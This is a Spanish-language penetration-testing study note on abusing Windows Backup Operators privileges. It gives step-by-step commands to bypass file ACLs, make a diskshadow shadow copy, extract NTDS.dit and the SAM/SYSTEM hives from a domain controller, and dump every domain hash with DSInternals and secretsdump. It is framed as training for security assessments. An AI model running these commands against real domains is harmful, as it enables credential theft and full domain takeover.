tags:
___
## 🧠 Concepto clave
Windows incluye una serie de grupos built-in que otorgan privilegios especiales a sus miembros, pensados para delegar tareas administrativas específicas sin necesidad de crear más Domain Admins. Sin embargo, la membresía en estos grupos puede ser abusada para escalar privilegios tanto en servidores como en Domain Controllers. Esta sección se centra en el grupo **Backup Operators** y sus dos privilegios asociados. 📄 [Listado completo de grupos built-in — SS64](https://ss64.com/nt/syntax-security_groups.html) — 📄 [Cuentas y grupos privilegiados en AD — Microsoft](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)

| Privilegio | Qué es | Riesgo / Explotación |
|---|---|---|
| `SeBackupPrivilege` | Permite atravesar cualquier carpeta y copiar archivos ignorando las ACLs, usando el flag `FILE_FLAG_BACKUP_SEMANTICS` | Acceso a cualquier archivo del sistema independientemente de sus permisos — incluyendo NTDS.dit, SAM y SYSTEM 📄 [Privileges — Microsoft Docs](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) |
| `SeRestorePrivilege` | Permite restaurar archivos y directorios saltándose los permisos del sistema de archivos | Puede usarse para sobreescribir archivos críticos del sistema o modificar claves de registro protegidas |

## 📌 Puntos importantes

### El grupo Backup Operators

Los miembros del grupo **Backup Operators** reciben automáticamente `SeBackupPrivilege` y `SeRestorePrivilege`. Estos privilegios existen para permitir realizar copias de seguridad del sistema sin necesitar ser administrador, pero en la práctica otorgan un nivel de acceso que equivale casi al de un Domain Admin. Lo más crítico es que los miembros de este grupo **pueden iniciar sesión localmente en un Domain Controller**, lo que abre la puerta al ataque más devastador posible: la extracción del archivo `NTDS.dit`.

En entornos reales, cuentas de servicio de backup o aplicaciones de terceros pueden acabar en este grupo. Durante un assessment, siempre hay que comprobar la membresía de estos grupos e incluirla en el informe para que el cliente evalúe si sigue siendo necesaria.

> [!tip] Comprobar membresía en grupos del usuario actual
> ```powershell
> whoami /groups
> ```
> `whoami /groups` — Lista todos los grupos a los que pertenece el usuario actual, incluyendo grupos built-in como Backup Operators.

---

### Flujo de explotación — Copia de archivos protegidos

**Paso 1 — Importar las librerías del PoC de SeBackupPrivilege** 📄 [SeBackupPrivilege PoC — giuliano108](https://github.com/giuliano108/SeBackupPrivilege)

> [!tip] Importar las librerías del PoC de SeBackupPrivilege
> ```powershell
> Import-Module .\SeBackupPrivilegeUtils.dll
> Import-Module .\SeBackupPrivilegeCmdLets.dll
> ```
> `SeBackupPrivilegeUtils.dll` — Librería con las utilidades de bajo nivel para el flag `FILE_FLAG_BACKUP_SEMANTICS`.
> `SeBackupPrivilegeCmdLets.dll` — Expone los cmdlets de PowerShell para interactuar con el privilegio.

**Paso 2 — Verificar y habilitar SeBackupPrivilege**

El privilegio puede aparecer como `Disabled`. Si es así, se activa con el cmdlet proporcionado por el PoC. Dependiendo de la configuración del servidor, puede ser necesario abrir una consola elevada para bypasear UAC.

> [!tip] Verificar y habilitar SeBackupPrivilege
> ```powershell
> whoami /priv
> Get-SeBackupPrivilege
> Set-SeBackupPrivilege
> Get-SeBackupPrivilege
> ```
> `whoami /priv` — Muestra todos los privilegios del usuario actual y su estado (Enabled/Disabled).
> `Get-SeBackupPrivilege` — Cmdlet del PoC que indica si SeBackupPrivilege está activo en el token actual.
> `Set-SeBackupPrivilege` — Activa SeBackupPrivilege en el token del proceso actual sin necesidad de reiniciar sesión.

**Paso 3 — Copiar el archivo protegido**

El comando estándar `copy` no funciona aquí — hay que usar el cmdlet `Copy-FileSeBackupPrivilege`, que implementa internamente el flag `FILE_FLAG_BACKUP_SEMANTICS` para saltarse las ACLs.

> [!tip] Copiar un archivo protegido saltándose las ACLs
> ```powershell
> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
> ```
> `Copy-FileSeBackupPrivilege` — Cmdlet del PoC que copia el archivo usando `FILE_FLAG_BACKUP_SEMANTICS`, ignorando los permisos NTFS estándar.
> `'C:\Confidential\2021 Contract.txt'` — Ruta al archivo protegido origen.
> `.\Contract.txt` — Ruta de destino donde se copiará el archivo.

> ⚠️ Si un archivo o carpeta tiene una entrada de **denegación explícita** para el usuario o su grupo, este método no funcionará — las denegaciones explícitas tienen prioridad sobre el flag de backup.

---

### Flujo de explotación — Ataque a un Domain Controller: extracción de NTDS.dit

`NTDS.dit` es la base de datos de Active Directory, almacenada en `C:\Windows\NTDS\` en los Domain Controllers. Contiene los **hashes NTLM de todas las cuentas del dominio** — usuarios, equipos y el propio krbtgt. Obtenerla equivale a comprometer completamente el dominio. El problema es que el archivo está bloqueado por el sistema mientras el DC está en funcionamiento.

**Paso 1 — Crear una shadow copy del disco C: con diskshadow y exponerla como unidad E:** 📄 [diskshadow — Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)

`diskshadow` es una utilidad nativa de Windows para gestionar shadow copies (VSS). Al crear una copia del volumen C:, el `NTDS.dit` dentro de esa copia no está bloqueado por el sistema operativo y puede copiarse libremente.

> [!tip] Crear shadow copy del disco C: y exponerla como unidad E:
> ```cmd
> diskshadow.exe
> set verbose on
> set metadata C:\Windows\Temp\meta.cab
> set context clientaccessible
> set context persistent
> begin backup
> add volume C: alias cdrive
> create
> expose %cdrive% E:
> end backup
> exit
> ```
> `set verbose on` — Activa la salida detallada para seguir el proceso paso a paso.
> `set metadata` — Define la ruta del archivo de metadatos de la shadow copy.
> `set context clientaccessible` — Hace la shadow copy accesible desde aplicaciones de usuario.
> `set context persistent` — La shadow copy persiste tras reiniciar diskshadow.
> `add volume C: alias cdrive` — Añade el volumen C: al backup con el alias `cdrive`.
> `create` — Crea la shadow copy del volumen especificado.
> `expose %cdrive% E:` — Monta la shadow copy como unidad E: accesible desde el sistema de archivos.

**Paso 2 — Copiar NTDS.dit desde la shadow copy**

> [!tip] Copiar NTDS.dit desde la shadow copy con Copy-FileSeBackupPrivilege
> ```powershell
> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
> ```
> `E:\Windows\NTDS\ntds.dit` — Ruta al NTDS.dit dentro de la shadow copy montada como E:.
> `C:\Tools\ntds.dit` — Destino local donde se guardará la copia extraída.

Alternativa nativa sin herramientas externas usando **robocopy** en modo backup 📄 [robocopy — Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy):

> [!tip] Copiar NTDS.dit con robocopy en modo backup (sin herramientas externas)
> ```cmd
> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
> ```
> `/B` — Modo backup. Usa `FILE_FLAG_BACKUP_SEMANTICS` internamente para saltarse las ACLs sin necesitar herramientas externas.
> `E:\Windows\NTDS` — Directorio origen dentro de la shadow copy.
> `.\ntds` — Directorio de destino local.
> `ntds.dit` — Archivo específico a copiar.

**Paso 3 — Hacer backup de SAM y SYSTEM del registro**

Además de NTDS.dit, se pueden exportar las colmenas SAM y SYSTEM del registro, que permiten extraer las credenciales de cuentas locales del DC:

> [!tip] Exportar las colmenas SAM y SYSTEM del registro
> ```cmd
> reg save HKLM\SYSTEM SYSTEM.SAV
> reg save HKLM\SAM SAM.SAV
> ```
> `reg save` — Exporta una colmena del registro a un archivo en disco.
> `HKLM\SYSTEM` — Colmena necesaria para obtener la boot key con la que se descifran los hashes.
> `HKLM\SAM` — Colmena que contiene los hashes de las cuentas locales del sistema.

**Paso 4 — Extraer hashes de NTDS.dit con DSInternals (online)**

> [!tip] Extraer el hash de una cuenta específica con DSInternals
> ```powershell
> Import-Module .\DSInternals.psd1
> $key = Get-BootKey -SystemHivePath .\SYSTEM
> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
> ```
> `Get-BootKey -SystemHivePath .\SYSTEM` — Extrae la boot key del archivo SYSTEM exportado, necesaria para descifrar los hashes de NTDS.dit.
> `-DistinguishedName` — DN completo de la cuenta a consultar dentro de la base de datos de AD.
> `-DBPath .\ntds.dit` — Ruta al archivo NTDS.dit extraído del DC.
> `-BootKey $key` — Boot key obtenida en el paso anterior, usada para descifrar los hashes almacenados.

**Paso 5 — Extraer todos los hashes con secretsdump.py (offline, desde la máquina atacante)**

> [!tip] Extraer todos los hashes del dominio offline con secretsdump.py
> ```bash
> secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
> ```
> `-ntds ntds.dit` — Ruta al archivo NTDS.dit extraído del DC.
> `-system SYSTEM` — Ruta al archivo SYSTEM del registro, necesario para obtener la boot key.
> `-hashes lmhash:nthash` — Formato de salida de los hashes extraídos.
> `LOCAL` — Modo offline, opera sobre archivos locales en lugar de conectarse a un sistema remoto.

Los hashes obtenidos pueden usarse directamente para **pass-the-hash** o crackearse offline con **Hashcat** para obtener contraseñas en texto claro. Presentar estadísticas de cracking al cliente ofrece una visión valiosa sobre la fortaleza general de las contraseñas en el dominio y permite hacer recomendaciones sobre la política de contraseñas.

---

## 🔗 Relaciones / Contexto

El ataque a través de **Backup Operators** es uno de los paths de escalada más directos hacia el compromiso total de un dominio de Active Directory. Obtener NTDS.dit equivale a tener todos los hashes del dominio — incluyendo el del **krbtgt**, que permite crear **Golden Tickets** para persistencia indefinida. Combinado con pass-the-hash sobre el hash del Administrador del dominio, un atacante puede moverse lateralmente a cualquier sistema del dominio de forma inmediata. Es fundamental que durante un assessment se revise siempre la membresía de este grupo y se documente cualquier cuenta que no debería estar en él.